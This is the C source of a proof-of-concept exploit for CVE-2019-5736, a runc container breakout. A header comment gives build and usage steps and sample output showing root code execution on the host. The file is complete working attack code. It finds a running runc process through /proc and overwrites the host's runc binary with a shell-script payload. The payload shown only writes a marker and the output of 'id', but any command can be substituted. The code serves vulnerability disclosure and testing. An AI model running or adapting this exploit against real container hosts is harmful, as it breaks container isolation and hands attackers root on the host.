/*
* CVE-2019-5736: runc container breakout (all versions)
* More info: https://seclists.org/oss-sec/2019/q1/119
*
* tested on runc with docker
* written by @ancat, thanks to @itszn13 and @sixhundredns for help
* 
* $ gcc runc-cve-2019-5736.c -o exploit
*
* # in container as root
* # ./exploit
* waiting for a target runc process...
* <<<< at this point use `docker exec` to interact with this container to trigger the exploit >>>>
* found a runc binary at pid=33810, suspending it so we can mess around
* runc @ /proc/33810/exe
* opened rdonly handle to runc
* letting the target process complete 33810 (kill -CONT)
* opening parent's handle to exe as rw (/proc/33809/fd/3)
* success! 4 should be read write
* success! replaced the host's runc binary with the payload (89 bytes out)
*
* # on parent host
* $ cat /usr/bin/runc
* #!/bin/sh
* # this was dropped by the container
* echo poop >> /tmp/hacked
* id >> /tmp/hacked
*
* $ cat /tmp/hacked
* poop
* uid=0(root) gid=0(root) groups=0(root)
*/

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <dirent.h>

char payload[] = "#!/bin/sh\n"
                 "# this was dropped by the container\n"
                 "echo poop >> /tmp/hacked\n"
                 "id >> /tmp/hacked\n";

int get_runc_pid() {
        DIR* proc = opendir("/proc/");
        if (proc == NULL) {
                perror("opendir");
                exit(2);
        }

        struct dirent *dp;
        int pid = 0;
        char progname[255] = {0};
        char* cmdline;
        while ((dp = readdir(proc)) != NULL) {
                pid = atoi(dp->d_name);
                if (!pid) {
                        continue;
                }

                asprintf(&cmdline, "/proc/%d/cmdline", pid);
                int pid_fd = open(cmdline, O_RDONLY);
                if (pid_fd < 0)
                        continue;

                read(pid_fd, progname, 254);
                if (strncmp(progname, "/proc/self/exe", strlen("/proc/self/exe")) == 0) {
                        free(cmdline);
                        close(pid_fd);
                        closedir(proc);
                        return pid;
                }
                free(cmdline);
                close(pid_fd);
        }

        closedir(proc);
        return 0;
}

int main(int argc, char** argv) {
        int target_pid;//= atoi(argv[1]);

        if (argc > 1) {
                target_pid = atoi(argv[1]);
        } else {
                printf("waiting for a target runc process...\n");
                while (1) {
                        target_pid = get_runc_pid();
                        if (target_pid != 0) {
                                printf("found a runc binary at pid=%d, suspending it so we can mess around\n", target_pid);
                                kill(target_pid, 19); // stop
                                break;
                        }
                }
        }

        char* runc_path;
        asprintf(&runc_path, "/proc/%d/exe", target_pid);
        printf("runc @ %s\n", runc_path);

        int exe = open(runc_path, O_RDONLY);
        if (exe < 0) {
                perror("open");
                exit(1);
        }

        printf("opened rdonly handle to runc\n");
        printf("letting the target process complete %d (kill -CONT)\n", target_pid);
        if (kill(target_pid, 18) < 0) {
                perror("kill");
                exit(69);
        }

        int pid = fork();
        if (pid < 0) {
                perror("fork");
        }

        if (pid == 0) {
                int parent = getppid();
                char* indirect_exe;
                asprintf(&indirect_exe, "/proc/%d/fd/3", parent);
                printf("opening parent's handle to exe as rw (%s)\n", indirect_exe);
                while(1) {
                        int indirect_fd = open(indirect_exe, O_RDWR | O_TRUNC);
                        if (indirect_fd < 0) {
                                // perror("open3");
                                continue;
                        }

                        printf("success! %d should be read write\n", indirect_fd);
                        int bytes_out = write(indirect_fd, payload, strlen(payload));
                        close(indirect_fd);
                        printf("success! replaced the host's runc binary with the payload (%d bytes out)\n", bytes_out);
                        break;
                }
                        while (1) {}
        } else {
                waitpid(pid, NULL, 0);
                printf("parent exiting\n");
                        while (1) {}
                exit(6);
        }

        exit(1);
}
